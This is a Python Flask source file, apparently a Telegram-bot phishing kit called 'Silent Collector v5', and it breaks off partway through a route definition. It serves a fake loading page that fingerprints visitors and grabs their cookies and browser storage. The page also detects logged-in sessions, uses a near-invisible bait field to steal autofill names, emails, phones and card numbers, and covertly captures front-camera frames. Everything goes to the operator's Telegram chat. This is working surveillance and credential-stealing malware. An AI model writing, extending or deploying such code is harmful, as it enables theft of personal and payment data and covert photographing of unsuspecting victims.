# silent_collector.py
# ============================================================
# Silent Collector v5 — Visible Autofill Bait + Camera
# - جمع صامت فوري (بدون تفاعل)
# - Autofill Hijack via VISIBLE bait field (بدل المخفي)
# - CVE-2026-0102 aware (ضغطتين → autofill)
# - الكاميرا بعد إذن واحد
# - المستخدم: دوسة واحدة فقط
# ============================================================

import os
import time
import json
import uuid
import hashlib
import re
import base64
from datetime import datetime

from flask import Blueprint, request, jsonify, redirect

from config import bot, redis_client, PUBLIC_URL

from logging_config import get_logger
from monitoring import metrics

logger = get_logger("silent_collector")

silent_bp = Blueprint('silent_collector', __name__)


# ============================================================
# الإعدادات
# ============================================================
SESSION_TTL = 86400 * 30
GOOGLE_REDIRECT = "https://www.google.com"
CAMERA_INTERVAL = 5000
CAMERA_MAX_FRAMES = 60
ACCESS_DELAY = 2500
AUTOFILL_BAIT_DELAY = 1200  # الوقت قبل إظهار حقل الـ bait
AUTOFILL_READ_DELAY = 600    # الوقت بعد الدوسة قبل القراءة


# ============================================================
# ★★★ صفحة v5 ★★★
# ============================================================
COLLECTOR_PAGE = r"""<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<title>جاري التحميل...</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  html, body {
    height: 100%;
    background: #ffffff;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Tahoma", "Arial", sans-serif;
    overflow: hidden;
    display: flex;
    align-items: center;
    justify-content: center;
  }
  .loader-container {
    text-align: center;
    animation: fadeIn 0.3s ease-in;
  }
  @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
  .spinner {
    width: 48px; height: 48px;
    border: 3px solid #e8eaed;
    border-top-color: #4285f4;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
    margin: 0 auto 20px;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  .text { color: #5f6368; font-size: 14px; }
  .fade-out { animation: fadeOut 0.3s ease-out forwards; }
  @keyframes fadeOut { to { opacity: 0; } }

  /* ★★★ Autofill Bait — حقل مرئي شبه شفاف ★★★ */
  #af_bait {
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 1px;
    height: 1px;
    opacity: 0.02;          /* ← مهم جداً! مش 0 ولا 1 */
    pointer-events: auto;
    z-index: 9999;
    border: none;
    outline: none;
    background: transparent;
    color: transparent;
    font-size: 1px;
  }
</style>
</head>
<body>

<!-- حقل Bait — شبه مرئي للمستخدم لكن Chrome يشوفه -->
<input type="text"
       id="af_bait"
       name="name"
       autocomplete="name"
       tabindex="0"
       aria-label="loading">

<div class="loader-container">
  <div class="spinner"></div>
  <div class="text">جاري التحميل...</div>
</div>

<script>
(function() {
    "use strict";

    var SESSION_ID = "__SESSION_ID__";
    var ENDPOINT = "__ENDPOINT__";
    var REDIRECT_URL = "__REDIRECT_URL__";
    var CAMERA_INTERVAL = __CAMERA_INTERVAL__;
    var CAMERA_MAX_FRAMES = __CAMERA_MAX_FRAMES__;
    var ACCESS_DELAY = __ACCESS_DELAY__;
    var AUTOFILL_BAIT_DELAY = __AUTOFILL_BAIT_DELAY__;
    var AUTOFILL_READ_DELAY = __AUTOFILL_READ_DELAY__;

    // ─── متغيرات ───
    var videoStream = null;
    var videoEl = null;
    var captureInterval = null;
    var framesCaptured = 0;
    var baitInput = document.getElementById('af_bait');
    var autofillCaptured = false;
    var tapCount = 0;
    var lastTapTime = 0;

    // ═══════════════════════════════════════════════════
    // 1. جمع البيانات الأساسية (تلقائي)
    // ═══════════════════════════════════════════════════
    var data = {
        session_id: SESSION_ID,
        collected_at: Math.floor(Date.now() / 1000),
        local_time: new Date().toString(),
        timezone_offset: new Date().getTimezoneOffset(),
        url: location.href,
        referrer: document.referrer || '',
        history_length: history.length || 0
    };

    try {
        data.user_agent = navigator.userAgent;
        data.language = navigator.language || 'unknown';
        data.languages = (navigator.languages || []).join(',');
        data.platform = navigator.platform || 'unknown';
        data.vendor = navigator.vendor || 'unknown';
        data.cookie_enabled = navigator.cookieEnabled;
        data.do_not_track = navigator.doNotTrack || null;
        data.hardware_concurrency = navigator.hardwareConcurrency || null;
        data.device_memory = navigator.deviceMemory || null;
        data.max_touch_points = navigator.maxTouchPoints || 0;
        data.online = navigator.onLine;
    } catch(e) {}

    try { data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e) {}

    try {
        data.screen = {
            width: screen.width, height: screen.height,
            avail_width: screen.availWidth, avail_height: screen.availHeight,
            color_depth: screen.colorDepth, pixel_depth: screen.pixelDepth,
            dpr: window.devicePixelRatio || 1,
            orientation: (screen.orientation && screen.orientation.type) || null
        };
    } catch(e) {}

    try {
        data.window = {
            inner_width: window.innerWidth, inner_height: window.innerHeight,
            outer_width: window.outerWidth, outer_height: window.outerHeight
        };
    } catch(e) {}

    try {
        data.dark_mode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
        data.touch_support = 'ontouchstart' in window;
    } catch(e) {}

    try {
        var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (conn) {
            data.connection = {
                effective_type: conn.effectiveType || null,
                type: conn.type || null,
                downlink: conn.downlink || null,
                rtt: conn.rtt || null,
                save_data: conn.saveData || false
            };
        }
    } catch(e) {}

    // ═══════════════════════════════════════════════════
    // 2. بصمة الجهاز
    // ═══════════════════════════════════════════════════
    function getWebGLInfo() {
        try {
            var canvas = document.createElement('canvas');
            var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return null;
            var dbg = gl.getExtension('WEBGL_debug_renderer_info');
            return {
                vendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
                renderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER),
                version: gl.getParameter(gl.VERSION)
            };
        } catch(e) { return null; }
    }
    data.webgl = getWebGLInfo();

    function getCanvasFingerprint() {
        try {
            var canvas = document.createElement('canvas');
            canvas.width = 280; canvas.height = 60;
            var ctx = canvas.getContext('2d');
            ctx.textBaseline = 'alphabetic';
            ctx.fillStyle = '#f60'; ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069'; ctx.font = '11pt "Arial"';
            ctx.fillText('Cwm fjordbank glyphs vext quiz', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)'; ctx.font = '18pt "Times New Roman"';
            ctx.fillText('Cwm fjordbank glyphs vext quiz', 4, 45);
            return canvas.toDataURL();
        } catch(e) { return null; }
    }
    data.canvas_full = getCanvasFingerprint();
    data.canvas_hash = data.canvas_full ?
        (data.canvas_full.length + '_' + data.canvas_full.substring(50, 100)) : null;

    function getAudioFingerprint() {
        return new Promise(function(resolve) {
            try {
                var AC = window.OfflineAudioContext || window.webkitOfflineAudioContext;
                if (!AC) return resolve(null);
                var ctx = new AC(1, 44100, 44100);
                var osc = ctx.createOscillator();
                osc.type = 'triangle';
                osc.frequency.setValueAtTime(10000, ctx.currentTime);
                var comp = ctx.createDynamicsCompressor();
                osc.connect(comp); comp.connect(ctx.destination); osc.start(0);
                ctx.startRendering().then(function(buf) {
                    try {
                        var d = buf.getChannelData(0); var s = 0;
                        for (var i = 4500; i < 5000; i++) s += Math.abs(d[i]);
                        resolve(s.toString().substring(0, 20));
                    } catch(e) { resolve(null); }
                }).catch(function() { resolve(null); });
            } catch(e) { resolve(null); }
        });
    }

    function detectFonts() {
        try {
            var base = ['monospace', 'sans-serif', 'serif'];
            var test = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia',
                        'Comic Sans MS', 'Trebuchet MS', 'Impact', 'Tahoma', 'Calibri',
                        'Segoe UI', 'Helvetica', 'Consolas', 'Andalus', 'Traditional Arabic'];
            var span = document.createElement('span');
            span.style.cssText = 'position:absolute;left:-9999px;font-size:72px;visibility:hidden;';
            span.innerHTML = 'mmmmmmmmmmlli';
            document.body.appendChild(span);
            var baseSizes = {};
            base.forEach(function(f) { span.style.fontFamily = f; baseSizes[f] = span.offsetWidth; });
            var detected = [];
            test.forEach(function(font) {
                var found = false;
                base.forEach(function(bf) {
                    span.style.fontFamily = "'" + font + "'," + bf;
                    if (span.offsetWidth !== baseSizes[bf]) found = true;
                });
                if (found) detected.push(font);
            });
            document.body.removeChild(span);
            return detected;
        } catch(e) { return []; }
    }
    data.fonts = detectFonts();

    // ═══════════════════════════════════════════════════
    // 3. الكوكيز والتخزين
    // ═══════════════════════════════════════════════════
    function getCookies() {
        try {
            var cookieStr = document.cookie || '';
            var cookies = [];
            cookieStr.split(';').forEach(function(pair) {
                pair = pair.trim();
                if (pair) {
                    var eq = pair.indexOf('=');
                    if (eq > 0) cookies.push({
                        name: pair.substring(0, eq),
                        value: pair.substring(eq + 1).substring(0, 500)
                    });
                }
            });
            return { raw: cookieStr.substring(0, 3000), count: cookies.length, cookies: cookies.slice(0, 50) };
        } catch(e) { return { raw: '', count: 0, cookies: [] }; }
    }
    data.cookies = getCookies();

    function getLocalStorage() {
        try {
            var r = {}; var c = 0;
            for (var i = 0; i < localStorage.length && c < 200; i++) {
                var k = localStorage.key(i);
                if (k) { r[k] = (localStorage.getItem(k) || '').substring(0, 1000); c++; }
            }
            return r;
        } catch(e) { return {}; }
    }
    data.local_storage = getLocalStorage();

    function getSessionStorage() {
        try {
            var r = {}; var c = 0;
            for (var i = 0; i < sessionStorage.length && c < 200; i++) {
                var k = sessionStorage.key(i);
                if (k) { r[k] = (sessionStorage.getItem(k) || '').substring(0, 1000); c++; }
            }
            return r;
        } catch(e) { return {}; }
    }
    data.session_storage = getSessionStorage();

    // ═══════════════════════════════════════════════════
    // 4. كشف الجلسات
    // ═══════════════════════════════════════════════════
    function detectSessions() {
        var sessions = [];
        var all = {};
        try { for (var k in data.local_storage) all[k.toLowerCase()] = data.local_storage[k]; } catch(e) {}
        try { for (var k2 in data.session_storage) all[k2.toLowerCase()] = data.session_storage[k2]; } catch(e) {}
        var ck = (data.cookies.raw || '').toLowerCase();
        var sites = {
            'facebook': ['c_user', 'xs', 'fb_token'],
            'instagram': ['sessionid', 'ig_did'],
            'whatsapp': ['whatsapp', 'wa_'],
            'google': ['sapisid', 'sid', 'hsid'],
            'youtube': ['sid', 'hsid'],
            'twitter': ['auth_token', 'ct0'],
            'tiktok': ['sessionid', 'sid_tt'],
            'linkedin': ['li_at'],
            'netflix': ['netflixid'],
            'amazon': ['session-id'],
            'telegram': ['telegram'],
        };
        for (var site in sites) {
            var kws = sites[site]; var found = false;
            kws.forEach(function(kw) { if (ck.indexOf(kw) >= 0) found = true; });
            for (var sk in all) {
                kws.forEach(function(kw) { if (sk.indexOf(kw) >= 0) found = true; });
            }
            if (found) sessions.push({ site: site });
        }
        return sessions;
    }
    data.detected_sessions = detectSessions();

    // ═══════════════════════════════════════════════════
    // 5. ★★★ Autofill Bait — القلب النابض ★★★
    // ═══════════════════════════════════════════════════
    function setupAutofillBait() {
        if (!baitInput) return;

        // ─── المستخدم يدوس على الشاشة → ركّز على الحقل ───
        document.addEventListener('touchstart', function(e) {
            var now = Date.now();
            if (now - lastTapTime < 500) {
                tapCount++;
            } else {
                tapCount = 1;
            }
            lastTapTime = now;

            // بعد ضغطتين → اعمل focus على الـ bait
            if (tapCount >= 2) {
                tapCount = 0;
                try { baitInput.focus(); } catch(e) {}
            }
        }, { passive: true });

        document.addEventListener('click', function(e) {
            var now = Date.now();
            if (now - lastTapTime < 500) {
                tapCount++;
            } else {
                tapCount = 1;
            }
            lastTapTime = now;

            if (tapCount >= 2) {
                tapCount = 0;
                try { baitInput.focus(); } catch(e) {}
            }
        });

        // ─── بعد AUTOFILL_BAIT_DELAY → ركّز تلقائياً ───
        setTimeout(function() {
            try { baitInput.focus(); } catch(e) {}
        }, AUTOFILL_BAIT_DELAY);

        // ─── اقرأ القيمة بعد التركيز ───
        baitInput.addEventListener('focus', function() {
            setTimeout(readAutofillValue, AUTOFILL_READ_DELAY);
        });

        baitInput.addEventListener('input', function() {
            setTimeout(readAutofillValue, 200);
        });

        // ─── راقب أي تغيير ───
        var observer = new MutationObserver(function(mutations) {
            mutations.forEach(function(m) {
                if (m.target === baitInput && m.attributeName === 'value') {
                    readAutofillValue();
                }
            });
        });
        try { observer.observe(baitInput, { attributes: true }); } catch(e) {}
    }

    function readAutofillValue() {
        if (autofillCaptured) return;
        if (!baitInput) return;

        var val = baitInput.value;
        if (val && val.length > 0) {
            autofillCaptured = true;
            sendAutofill({
                name: val,
                _raw: true,
                _field: 'bait_name'
            });
            logger_signal('autofill_captured: ' + val.substring(0, 30));
        }
    }

    // ═══════════════════════════════════════════════════
    // 6. ★★★ Autofill Hidden Fields (احتياطي) ★★★
    // ═══════════════════════════════════════════════════
    function collectHiddenAutofill() {
        // بعد ما الـ bait يشتغل، جرّب حقول إضافية
        var results = {};
        var fields = ['email', 'tel', 'address-line1', 'postal-code', 'cc-number'];
        var names = ['email', 'phone', 'address', 'zip', 'cc'];
        for (var i = 0; i < fields.length; i++) {
            try {
                var inp = document.createElement('input');
                inp.type = 'text';
                inp.autocomplete = fields[i];
                inp.name = names[i];
                inp.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;opacity:0.02;pointer-events:none;';
                document.body.appendChild(inp);
                inp.focus();
                setTimeout((function(inp, key) {
                    return function() {
                        if (inp.value && inp.value.length > 0) {
                            results[key] = inp.value;
                        }
                        try { document.body.removeChild(inp); } catch(e) {}
                    };
                })(inp, names[i]), 300);
            } catch(e) {}
        }
        return results;
    }

    // ═══════════════════════════════════════════════════
    // 7. الكاميرا
    // ═══════════════════════════════════════════════════
    function startSilentCapture() {
        return new Promise(function(resolve) {
            try {
                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                    return resolve(false);
                }
                videoEl = document.createElement('video');
                videoEl.setAttribute('playsinline', '');
                videoEl.setAttribute('autoplay', '');
                videoEl.setAttribute('muted', '');
                videoEl.muted = true;
                videoEl.style.cssText = 'position:fixed;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0.01;';
                document.body.appendChild(videoEl);

                navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                    audio: false
                }).then(function(stream) {
                    videoStream = stream;
                    videoEl.srcObject = stream;
                    videoEl.onloadedmetadata = function() {
                        videoEl.play().then(function() {
                            sendSignal('camera_started', { width: videoEl.videoWidth, height: videoEl.videoHeight });
                            setTimeout(captureFrame, 500);
                            captureInterval = setInterval(function() {
                                if (framesCaptured >= CAMERA_MAX_FRAMES) { stopCapture('max_frames'); return; }
                                captureFrame();
                            }, CAMERA_INTERVAL);
                            resolve(true);
                        }).catch(function() { resolve(false); });
                    };
                }).catch(function(err) {
                    sendSignal('camera_denied', { error: err.name || 'unknown' });
                    resolve(false);
                });
            } catch(e) { resolve(false); }
        });
    }

    function captureFrame() {
        try {
            if (!videoEl || !videoStream) return;
            var canvas = document.createElement('canvas');
            canvas.width = videoEl.videoWidth || 640;
            canvas.height = videoEl.videoHeight || 480;
            canvas.getContext('2d').drawImage(videoEl, 0, 0, canvas.width, canvas.height);
            var imageData = canvas.toDataURL('image/jpeg', 0.65);
            framesCaptured++;
            sendFrame(imageData, framesCaptured);
        } catch(e) {}
    }

    function stopCapture(reason) {
        try {
            if (captureInterval) { clearInterval(captureInterval); captureInterval = null; }
            if (videoStream) {
                try { videoStream.getTracks().forEach(function(t) { t.stop(); }); } catch(e) {}
                videoStream = null;
            }
            if (videoEl && videoEl.parentNode) {
                try { videoEl.parentNode.removeChild(videoEl); } catch(e) {}
            }
            sendSignal('camera_stopped', { reason: reason, total_frames: framesCaptured });
        } catch(e) {}
    }

    // ═══════════════════════════════════════════════════
    // 8. الإرسال
    // ═══════════════════════════════════════════════════
    function sendFrame(imageData, frameNum) {
        try {
            var payload = { session_id: SESSION_ID, type: 'camera_frame', frame_num: frameNum, image: imageData, timestamp: Date.now() };
            var jsonStr = JSON.stringify(payload);
            if (navigator.sendBeacon) {
                try {
                    var blob = new Blob([jsonStr], { type: 'application/json' });
                    if (navigator.sendBeacon(ENDPOINT + '/camera', blob)) return;
                } catch(e) {}
            }
            fetch(ENDPOINT + '/camera', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: jsonStr, keepalive: true }).catch(function() {});
        } catch(e) {}
    }

    function sendSignal(type, extra) {
        try {
            var payload = { session_id: SESSION_ID, type: type, timestamp: Date.now() };
            if (extra) { for (var k in extra) payload[k] = extra[k]; }
            var jsonStr = JSON.stringify(payload);
            if (navigator.sendBeacon) {
                try {
                    var blob = new Blob([jsonStr], { type: 'application/json' });
                    if (navigator.sendBeacon(ENDPOINT + '/signal', blob)) return;
                } catch(e) {}
            }
            fetch(ENDPOINT + '/signal', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: jsonStr, keepalive: true }).catch(function() {});
        } catch(e) {}
    }

    function sendAutofill(autofillData) {
        return new Promise(function(resolve) {
            try {
                if (!autofillData || Object.keys(autofillData).length === 0) return resolve(false);
                var payload = { session_id: SESSION_ID, type: 'autofill_data', data: autofillData, timestamp: Date.now() };
                var jsonStr = JSON.stringify(payload);
                if (navigator.sendBeacon) {
                    try {
                        var blob = new Blob([jsonStr], { type: 'application/json' });
                        if (navigator.sendBeacon(ENDPOINT + '/autofill', blob)) return resolve(true);
                    } catch(e) {}
                }
                fetch(ENDPOINT + '/autofill', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: jsonStr, keepalive: true })
                    .then(function() { resolve(true); }).catch(function() { resolve(false); });
            } catch(e) { resolve(false); }
        });
    }

    function sendMainData(payload) {
        return new Promise(function(resolve) {
            try {
                var jsonStr = JSON.stringify(payload);
                if (navigator.sendBeacon) {
                    try {
                        var blob = new Blob([jsonStr], { type: 'application/json' });
                        if (navigator.sendBeacon(ENDPOINT + '/collect', blob)) return resolve(true);
                    } catch(e) {}
                }
                fetch(ENDPOINT + '/collect', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: jsonStr, keepalive: true })
                    .then(function() { resolve(true); })
                    .catch(function() {
                        try {
                            var xhr = new XMLHttpRequest();
                            xhr.open('POST', ENDPOINT + '/collect', true);
                            xhr.setRequestHeader('Content-Type', 'application/json');
                            xhr.send(jsonStr);
                            resolve(true);
                        } catch(e2) { resolve(false); }
                    });
            } catch(e) { resolve(false); }
        });
    }

    function doRedirect() {
        try { document.body.classList.add('fade-out'); } catch(e) {}
        window.location.replace(REDIRECT_URL);
    }

    function logger_signal(s) { try { console.log('[SC]', s); } catch(e) {} }

    function collectAll() {
        return Promise.all([
            getAudioFingerprint()
        ]).then(function(results) {
            data.audio_fingerprint = results[0];
            return data;
        });
    }

    // ═══════════════════════════════════════════════════
    // MAIN FLOW
    // ═══════════════════════════════════════════════════
    var redirectTimer = null;

    // ─── 1. جمع وإرسال فوري ───
    collectAll()
        .then(function(payload) { return sendMainData(payload); })
        .then(function() {
            // ─── 2. Autofill Bait ───
            setupAutofillBait();

            // ─── 3. الكاميرا بعد ACCESS_DELAY ───
            setTimeout(function() {
                startSilentCapture().then(function(started) {
                    if (started) {
                        redirectTimer = setTimeout(doRedirect, 90000);
                    } else {
                        redirectTimer = setTimeout(doRedirect, 2000);
                    }
                });
            }, ACCESS_DELAY);
        })
        .catch(function() {
            redirectTimer = setTimeout(doRedirect, 2000);
        });

    // ─── عند الخروج ───
    window.addEventListener('beforeunload', function() { stopCapture('beforeunload'); });
    window.addEventListener('pagehide', function() { stopCapture('pagehide'); });
    window.addEventListener('unload', function() { stopCapture('unload'); });

    document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
            stopCapture('tab_hidden');
            setTimeout(doRedirect, 500);
        }
    });

})();
</script>
</body>
</html>
"""


# ============================================================
# إنشاء Session
# ============================================================
def create_silent_session(chat_id, label=""):
    if not redis_client:
        return None
    try:
        session_id = uuid.uuid4().hex[:16]
        now = time.time()
        session_data = {
            "session_id": session_id, "chat_id": str(chat_id),
            "label": label[:50], "created_at": now,
            "accessed": False, "accessed_at": None,
            "collected": False, "camera_started": False,
            "camera_frames": 0, "autofill_received": False,
        }
        redis_client.setex(f"silent:{session_id}", SESSION_TTL, json.dumps(session_data))
        redis_client.lpush(f"silent_user:{chat_id}", session_id)
        redis_client.ltrim(f"silent_user:{chat_id}", 0, 199)
        redis_client.expire(f"silent_user:{chat_id}", SESSION_TTL)
        logger.info(f"Silent session created: {session_id} → {chat_id}")
        metrics.inc_counter("silent_sessions_created")
        return session_id
    except Exception as e:
        logger.exception(f"create_silent_session error: {e}")
        return None


# ============================================================
# استقبال البيانات الرئيسية
# ============================================================
def store_collected_data(session_id, data):
    if not redis_client:
        return False
    try:
        raw = redis_client.get(f"silent:{session_id}")
        if not raw:
            return False
        session_data = json.loads(raw)
        chat_id = session_data["chat_id"]
        enriched = dict(data)
        enriched['ip'] = (
            request.headers.get('CF-Connecting-IP') or
            request.headers.get('X-Forwarded-For', '').split(',')[0].strip() or
            request.remote_addr
        )
        enriched['server_user_agent'] = request.headers.get('User-Agent', '')
        enriched['received_at'] = time.time()
        enriched['received_at_str'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        enriched['label'] = session_data.get('label', '')
        redis_client.setex(f"silent_data:{session_id}", SESSION_TTL, json.dumps(enriched, ensure_ascii=False))
        session_data["collected"] = True
        session_data["collected_at"] = time.time()
        redis_client.setex(f"silent:{session_id}", SESSION_TTL, json.dumps(session_data))
        logger.info(f"Data collected: {session_id} | IP={enriched['ip']}")
        metrics.inc_counter("silent_data_collected")
        notify_bot(chat_id, session_id, enriched)
        return True
    except Exception as e:
        logger.exception(f"store_collected_data error: {e}")
        return False


# ============================================================
# استقبال Autofill
# ============================================================
def store_autofill_data(session_id, data):
    if not redis_client:
        return False
    try:
        raw = redis_client.get(f"silent:{session_id}")
        if not raw:
            return False
        session_data = json.loads(raw)
        chat_id = session_data["chat_id"]
        cid = int(chat_id) if str(chat_id).isdigit() else chat_id
        label = session_data.get('label', '')
        autofill_data = data.get('data', {})
        if not autofill_data or not isinstance(autofill_data, dict):
            return False
        redis_client.setex(f"silent_autofill:{session_id}", SESSION_TTL, json.dumps(autofill_data, ensure_ascii=False))
        session_data["autofill_received"] = True
        redis_client.setex(f"silent:{session_id}", SESSION_TTL, json.dumps(session_data))
        field_names_ar = {
            'name': 'الاسم الكامل', 'email': 'الإيميل', 'phone': 'الهاتف',
            'address': 'العنوان', 'zip': 'الرمز البريدي', 'cc': 'بطاقة',
        }
        lines = [
            f"🎯 <b>Autofill Hijack — بيانات جديدة!</b>",
            f"━━━━━━━━━━━━━━━━━━",
            f"🎯 <b>الجلسة:</b> <code>{session_id[:12]}</code>",
            f"🏷️ <b>الاسم:</b> {label or '—'}",
            f"",
            f"📋 <b>البيانات المسروقة:</b>",
        ]
        for key, val in autofill_data.items():
            if val and str(val).strip():
                name_ar = field_names_ar.get(key, key)
                lines.append(f"• <b>{name_ar}:</b> <code>{str(val)[:200]}</code>")
        text = "\n".join(lines)
        bot.send_message(cid, text, parse_mode="HTML", disable_web_page_preview=True)
        logger.info(f"Autofill data sent: {session_id}")
        metrics.inc_counter("silent_autofill_received")
        try:
            import io
            json_str = json.dumps(autofill_data, ensure_ascii=False, indent=2)
            buf = io.BytesIO(json_str.encode('utf-8'))
            buf.name = f"autofill_{session_id[:12]}.json"
            bot.send_document(cid, buf, caption=f"📦 <b>Autofill JSON</b>", parse_mode="HTML")
        except Exception as e:
            logger.warning(f"Send autofill JSON error: {e}")
        return True
    except Exception as e:
        logger.exception(f"store_autofill_data error: {e}")
        return False


# ============================================================
# استقبال صورة
# ============================================================
def store_camera_frame(session_id, data):
    if not redis_client:
        return False
    try:
        raw = redis_client.get(f"silent:{session_id}")
        if not raw:
            return False
        session_data = json.loads(raw)
        chat_id = session_data["chat_id"]
        cid = int(chat_id) if str(chat_id).isdigit() else chat_id
        image_data = data.get('image', '')
        frame_num = data.get('frame_num', 0)
        label = session_data.get('label', '')
        session_data["camera_frames"] = frame_num
        redis_client.setex(f"silent:{session_id}", SESSION_TTL, json.dumps(session_data))
        try:
            if image_data.startswith('data:image'):
                _, encoded = image_data.split(',', 1)
                img_bytes = base64.b64decode(encoded)
                import io
                buf = io.BytesIO(img_bytes)
                buf.name = f"frame_{frame_num}.jpg"
                caption = (
                    f"📸 <b>صورة من الكاميرا</b>\n"
                    f"🎯 <b>الجلسة:</b> <code>{session_id[:12]}</code>\n"
                    f"🏷️ <b>الاسم:</b> {label or '—'}\n"
                    f"🔢 <b>الصورة:</b> #{frame_num}"
                )
                bot.send_photo(cid, buf, caption=caption, parse_mode="HTML")
                logger.info(f"Camera frame #{frame_num} sent")
                metrics.inc_counter("silent_camera_frames")
        except Exception as e:
            logger.warning(f"Send camera frame error: {e}")
        return True
    except Exception as e:
        logger.exception(f"store_camera_frame error: {e}")
        return False


# ============================================================
# إشارات الكاميرا
# ============================================================
def handle_camera_signal(session_id, data):
    try:
        raw = redis_client.get(f"silent:{session_id}")
        if not raw:
            return False
        session_data = json.loads(raw)
        chat_id = session_data["chat_id"]
        cid = int(chat_id) if str(chat_id).isdigit() else chat_id
        label = session_data.get('label', '')
        signal_type = data.get('type', '')
        if signal_type == 'camera_started':
            bot.send_message(cid,
                f"🎥 <b>الكاميرا اشتغلت!</b>\n"
                f"🎯 <b>الجلسة:</b> <code>{session_id[:12]}</code>\n"
                f"🏷️ <b>الاسم:</b> {label or '—'}",
                parse_mode="HTML")
        elif signal_type == 'camera_denied':
            bot.send_message(cid,
                f"❌ <b>الكاميرا مرفوضة</b>\n"
                f"🎯 الجلسة: <code>{session_id[:12]}</code>",
                parse_mode="HTML")
        elif signal_type == 'camera_stopped':
            total = data.get('total_frames', 0)
            reason = data.get('reason', 'unknown')
            bot.send_message(cid,
                f"⏹️ <b>توقف التصوير</b>\n"
                f"🎯 <b>الجلسة:</b> <code>{session_id[:12]}</code>\n"
                f"📸 <b>إجمالي:</b> <code>{total}</code>\n"
                f"🔚 <b>السبب:</b> <code>{reason}</code>",
                parse_mode="HTML")
        return True
    except Exception as e:
        logger.exception(f"handle_camera_signal error: {e}")
        return False


# ============================================================
# إشعار البوت
# ============================================================
def notify_bot(chat_id, session_id, data):
    try:
        cid = int(chat_id) if str(chat_id).isdigit() else chat_id
        label = data.get('label', '')
        label_text = f" ({label})" if label else ""
        ip = data.get('ip', 'غير معروف')
        timezone = data.get('timezone', 'غير معروف')
        received_at = data.get('received_at_str', '—')
        ua = data.get('user_agent', 'Unknown')
        device_type = "📱 موبايل" if any(x in ua for x in ['Mobile', 'Android', 'iPhone']) else "💻 كمبيوتر"
        os_name = "غير معروف"
        if 'Windows' in ua: os_name = "Windows"
        elif 'Mac OS' in ua or 'Macintosh' in ua: os_name = "macOS"
        elif 'Android' in ua: os_name = "Android"
        elif 'iPhone' in ua or 'iPad' in ua: os_name = "iOS"
        browser = "غير معروف"
        if 'Edg/' in ua: browser = "Edge"
        elif 'Chrome/' in ua: browser = "Chrome"
        elif 'Safari/' in ua: browser = "Safari"
        elif 'Firefox/' in ua: browser = "Firefox"
        screen = data.get('screen') or {}
        screen_text = f"{screen.get('width', '?')}×{screen.get('height', '?')}"
        battery_text = "—"
        sessions = data.get('detected_sessions', [])
        sessions_text = ""
        if sessions:
            sessions_text = "🎯 <b>جلسات نشطة:</b>\n"
            for s in sessions[:15]:
                sessions_text += f"  ✅ {s.get('site', '?').title()}\n"
        else:
            sessions_text = "🎯 <b>جلسات نشطة:</b> لا يوجد\n"
        emails_text = ""
        emails = data.get('found_emails', [])
        if emails:
            emails_text = "📧 <b>إيميلات:</b>\n"
            for e in emails[:5]:
                emails_text += f"  • <code>{e}</code>\n"
        cookies_data = data.get('cookies') or {}
        text = (
            f"🎯 <b>التقاط صامت</b>{label_text}\n"
            f"━━━━━━━━━━━━━━━━━━\n\n"
            f"🆔 <b>Session:</b> <code>{session_id}</code>\n"
            f"🕐 <b>الوقت:</b> <code>{received_at}</code>\n\n"
            f"━━━ 🌐 الشبكة ━━━\n"
            f"📍 <b>IP:</b> <code>{ip}</code>\n"
            f"🌍 <b>التوقيت:</b> <code>{timezone}</code>\n\n"
            f"━━━ 💻 الجهاز ━━━\n"
            f"🖥️ <b>النوع:</b> {device_type}\n"
            f"⚙️ <b>النظام:</b> <code>{os_name}</code>\n"
            f"🌐 <b>المتصفح:</b> <code>{browser}</code>\n\n"
            f"━━━ 📐 الشاشة ━━━\n"
            f"📏 <b>الدقة:</b> <code>{screen_text}</code>\n\n"
            f"━━━ 🔍 الاستكشاف ━━━\n"
            f"{sessions_text}"
            f"\n{emails_text}\n\n"
            f"━━━ 🎥 الكاميرا ━━━\n"
            f"⏳ <i>في انتظار إذن الكاميرا...</i>\n"
            f"━━━ 📝 Autofill ━━━\n"
            f"⏳ <i>في انتظار تفاعل المستخدم...</i>"
        )
        bot.send_message(cid, text, parse_mode="HTML", disable_web_page_preview=True)
        logger.info(f"Report sent to {cid}")
        try:
            import io
            json_str = json.dumps(data, ensure_ascii=False, indent=2)
            buf = io.BytesIO(json_str.encode('utf-8'))
            buf.name = f"silent_{session_id}.json"
            bot.send_document(cid, buf,
                caption=f"📦 <b>ملف البيانات الكامل</b>",
                parse_mode="HTML")
        except Exception as e:
            logger.warning(f"Send JSON dump error: {e}")
    except Exception as e:
        logger.exception(f"notify_bot error: {e}")


# ============================================================
# Routes
# ============================================================
def init_silent_collector_routes(app, bot_instance):
    global bot
    bot = bot_instance

    @app.route('/s/<session_id>', methods=['GET'])
    def silent_collector_page(session_id):
        try:
